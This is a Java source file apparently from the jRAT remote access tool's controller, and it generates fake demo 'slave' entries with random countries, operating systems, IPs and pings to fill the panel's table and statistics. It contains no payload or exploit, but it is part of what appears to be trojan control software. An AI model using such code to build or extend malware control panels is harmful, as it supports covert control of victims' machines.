package se.jrat.client;

import java.util.Random;

import se.jrat.client.net.ConnectionHandler;
import se.jrat.client.settings.StatisticsCountry;
import se.jrat.client.settings.StatisticsOperatingSystem;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.NetUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.Version;

public class SampleMode {

	public static final String[] COUNTRIES = new String[] { "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AR", "AS", "AT", "AU", "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CS", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "unknown", "ES", "ET", "FAM", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB", "GD", "GE", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL", "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UK", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW" };
	public static final String[] OPERATINGSYSTEMS = new String[] { "Windows 7", "Windows 8.1", "Windows XP", "Windows 2000", "Mac OS X Yosemite", "Ubuntu Linux", "Kali GNU/Linux", "CentOS Linux", "Debian Linux", "Elementary OS Linux", "Mint Linux", "Slackware Linux", "Arch Linux", "Gentoo Linux", "SteamOS Linux", "Crunchbang Linux", "Fedora Linux", "Mageia Linux", "Alpine Linux", "LXLE Linux", "Raspbian Linux", "FreeBSD", "OpenBSD", "NetBSD", "DragonFlyBSD", "Solaris" };
	public static final String[] ARCH = new String[] { "x86", "x64" };

	private static boolean sampleMode = false;

	public static boolean isInSampleMode() {
		return sampleMode;
	}

	public static void start(boolean stats) {
		sampleMode = true;

		for (String s : OPERATINGSYSTEMS) {
			String country = randomCountry();
			make(country, s, stats);
		}
	}

	public static void make(String country, String os, boolean stats) {
		int i = (new Random()).nextInt(65535);

		String ip = NetUtils.randomizeIP() + " / " + i;

		int p = new Random().nextInt(500);

		Slave slave = generate(country, os, ip, p);

		if (stats) {
			int howMany = new Random().nextInt(100);
			for (int s = 0; s < howMany; s++) {
				StatisticsCountry.getGlobal().add(slave);
				StatisticsOperatingSystem.getGlobal().add(slave);
			}
		} else {
			ConnectionHandler.addSlave(slave);
			slave.setOperatingSystem(os);
			slave.setStatus(5);
			slave.setID(Constants.NAME + new Random().nextInt(1000));
			slave.setArch(ARCH[p % 2]);
			//slave.setPing(p);
			slave.setComputerName("Sample");
			slave.setUsername("Sample");
			slave.setVersion(Version.getVersion());
			Frame.mainModel.setValueAt(p + " ms", Utils.getRow(3, ip), 4);
		}
	}

	public static String randomCountry() {
		return COUNTRIES[new Random().nextInt(COUNTRIES.length - 1)];
	}

	public static Slave generate(final String c, final String os, String ip, final int p) {
		Slave slave = new Slave(ip) {
			@Override
			public String getCountry() {
				return c;
			}

			@Override
			public String getOperatingSystem() {
				return os;
			}

			@Override
			public int getPing() {
				//Frame.mainModel.setValueAt(p + " ms", Utils.getRow(3, getIP()), 4);
				return p;
			}
		};

		return slave;
	}

}
